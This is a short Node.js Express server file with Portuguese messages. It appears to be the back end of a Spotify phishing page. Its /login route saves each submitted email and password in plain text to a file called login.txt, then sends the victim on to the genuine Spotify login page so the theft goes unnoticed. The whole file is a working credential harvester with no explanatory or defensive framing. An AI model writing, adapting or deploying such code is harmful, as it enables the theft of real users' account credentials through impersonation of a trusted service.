const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    const email = req.body.username;
    const senha = req.body.password;

    const dirPath = path.join('/path/to/save/credentials');
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }

    const filePath = path.join(dirPath, 'login.txt');
    const userData = `Email: ${email}, Senha: ${senha}\n`;

    fs.appendFile(filePath, userData, (err) => {
        if (err) {
            res.status(500).send('Erro ao salvar os dados.');
        } else {
            res.redirect('https://accounts.spotify.com/pt-BR/login');
        }
    });
});

module.exports = app;
